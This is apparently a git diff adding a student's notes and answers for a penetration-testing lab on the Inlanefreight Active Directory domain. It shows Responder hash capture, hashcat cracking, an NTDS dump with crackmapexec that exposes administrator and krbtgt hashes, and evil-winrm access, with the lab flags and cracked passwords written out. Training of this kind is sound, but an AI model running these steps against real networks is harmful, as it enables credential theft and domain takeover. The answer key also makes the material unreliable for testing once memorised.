@@ -19,20 +19,97 @@ Practice writing up the findings using either WriteHat or the provided reporting
 Finish the penetration test and complete the questions below to conclude this module.
 
 
+okay so im gonna kinda list what we have so far then keep it moving and then piece together notes and steps 
+
+
+1. so we have dhawkins creds from ASREPRoasting -> dhawkins:Bacon1989
+2. we see that responder was able to get some responses we can dive deeper in a minute and try to get more 172.16.5.5 
+3. tomcat creds -> tomcat:admin 
+4. admin password reuse -> HOST = FILE01 (172.16.5.130) \ administrator:Welcome123! -> HOST DEV01 (172.16.5.200) \ administrator:Welcome123!
+5. Password in description field -> note left blank 
+6. used metasploit to get IPMI hash -> 172.16.5.127 -> ADMIN:5768797002000000e05179a2382122e7500df7c9949a89f08a1987132dd0f48fe2e1d37238c7448fa123456789abcdefa123456789abcdef140541444d494e:a60c216003306640422c8855b290c32c53319e5a
+7. Two hits on AD passwords -> abouldercron & asmith both have passwords of Welcome1 on 172.16.5.5 
+8. local file inclusion -> note left blank 
+9. command injection -> note left blank 
+10. directory listing enabled and exposing files -> 172.16.5.127/files 
+
+
+starting where we left off on 2. lets re run responder -> sudo responder -I ens224 -wrvd -> output: backupagent::INLANEFREIGHT:d1cd8dfe7ddcb243:3914D20161AD8E739FF05DB65278C3E6:01010000000000000033B3EE9792DB019BF2FEEF99AB1B680000000002000800450039005A00420001001E00570049004E002D005A003200460046004400330052004E0035005000320004003400570049004E002D005A003200460046004400330052004E003500500032002E00450039005A0042002E004C004F00430041004C0003001400450039005A0042002E004C004F00430041004C0005001400450039005A0042002E004C004F00430041004C00070008000033B3EE9792DB01060004000200000008003000300000000000000000000000003000000B536BD2121D5284C8B4D9A60FA30377E63F2EE2B3F7A038436B567316047A660A001000000000000000000000000000000000000900220063006900660073002F003100370032002E00310036002E0035002E003200320035000000000000000000
+
+lets take it to our host machine and crack it -> hashcat -m 5600 backup.hash /usr/share/wordlists/rockyou.txt -> 
+
+Output: BACKUPAGENT::INLANEFREIGHT:d1cd8dfe7ddcb243:3914d20161ad8e739ff05db65278c3e6:010100000000000<snipped>0035000000000000000000:Recovery7
+
+so we have backupagent:Recovery7 
+
+lets use this and rdp into the DC  -> FROM FIRST RDP'D session -> xfreerdp /v:172.16.5.5 /u:backupagent /p:Recovery7 
+
+Once connected get to file explorer and go to C:\Users\Administrator\Desktop ( if it says you dont have permission just click yes to permiss or whatever) once there get flag.txt -L>
+d0c_pwN_r3p0rt_reP3at!
+
+
+now going back to the first RDP'd session lets get the admins hash -> 
+
+sudo crackmapexec smb 172.16.5.5 -u backupagent -p Recovery7 --ntds
+SMB         172.16.5.5      445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
+SMB         172.16.5.5      445    DC01             [+] INLANEFREIGHT.LOCAL\backupagent:Recovery7 (Pwn3d!)
+SMB         172.16.5.5      445    DC01             [+] Dumping the NTDS, this could take a while so go grab a redbull...
+SMB         172.16.5.5      445    DC01             inlanefreight.local\administrator:500:aad3b435b51404eeaad3b435b51404ee:88ad09182de639ccc6579eb0849751cf:::
+SMB         172.16.5.5      445    DC01             guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+SMB         172.16.5.5      445    DC01             krbtgt:502:aad3b435b51404eeaad3b435b51404ee:16e26ba33e455a8c338142af8d89ffbc:::
+SMB         172.16.5.5      445    DC01             lab_adm:1001:aad3b435b51404eeaad3b435b51404ee:663715a1a8b957e8e9943cc98ea451b6:::
+SMB         172.16.5.5      445    DC01             inlanefreight.local\htb-student:1111:aad3b435b51404eeaad3b435b51404ee:2487a01dd672b583415cb52217824bb5:::
+<snipped> 
+
+
+after going through these we have the hash of KRBTGT and the hash for svc_reporting so we can crack the hash for svc_reporting 
+
+KRBTGT:502:aad3b435b51404eeaad3b435b51404ee:16e26ba33e455a8c338142af8d89ffbc:::
+
+svc_reporting:7608:aad3b435b51404eeaad3b435b51404ee:a6d3701ae426329951cf5214b7531140::: 
+
+
+hashcat -m 1000 'a6d3701ae426329951cf5214b7531140' /usr/share/wordlists/rockyou.txt -> a6d3701ae426329951cf5214b7531140:Reporter1! 
+
+
+
+for our final question it asks to get the powerful group svc_reporting is apart of -> on OG RDP'd session ->  evil-winrm -i 172.16.5.5 -u backupagent -p Recovery7
+
+output: 
+
+Local Group Memberships      *Backup Operators
+Global Group memberships     *Domain Users
+
 
 
 CHALLENGE: 
 
 
 Question 1 - Once you achieve Domain Admin level access, submit the contents of the flag.txt file on the Administrator Desktop on the DC01 host.
+rdp into box they give us
+once in, re run responder to get other hashes -> sudo responder -I ens224 -wrvd 
+get backupagent hash and crack it with hashcat 
+hashcat -m 5600 backup.hash /usr/share/wordlists/rockyou.txt -> cracked has of Recovery7 
 
+from FIRST RDP session we are now going to RDP again into the DC -> xfreerdp /v:172.16.5.5 /u:backupagent /p:Recovery7 +
+from here travel to file explorer and go to c:\Users\Administrator\Desktop\flag.txt  -> d0c_pwN_r3p0rt_reP3at! 
 
 Question 2 - After achieving Domain Admin, submit the NTLM hash of the KRBTGT account.
 
+back on the orginal RDP'd session run crackmapexec and gather all the hashes ->
+sudo crackmapexec smb 172.16.5.5 -u backupagent -p Recovery7 --ntds > hashes.txt 
+KRBTGT is one of the first to pop -> KRBTGT:502:aad3b435b51404eeaad3b435b51404ee:16e26ba33e455a8c338142af8d89ffbc:::
 
 Question 3 - Dump the NTDS file and perform offline password cracking. Submit the password of the svc_reporting user as your answer.
-
+from steps above... -> grep "svc_reporting" hashes.txt -> svc_reporting:7608:aad3b435b51404eeaad3b435b51404ee:a6d3701ae426329951cf5214b7531140::: 
+lets crack latter part of hash -> a6d3701ae426329951cf5214b7531140
+hashcat -m 1000 'a6d3701ae426329951cf5214b7531140' /usr/share/wordlists/rockyou.txt -> a6d3701ae426329951cf5214b7531140:Reporter1! 
 
 
 Question 4 -  What powerful local group does this user belong to?
+from OG RDP'd session we are going to use evil-winrm to enumerate the user -> 
+evil-winrm -i 172.16.5.5 -u backupagent -p Recovery7
+once connected run -> net user svc_reporting -> 
+Local Group Memberships      *Backup Operators
+Global Group memberships     *Domain Users
 
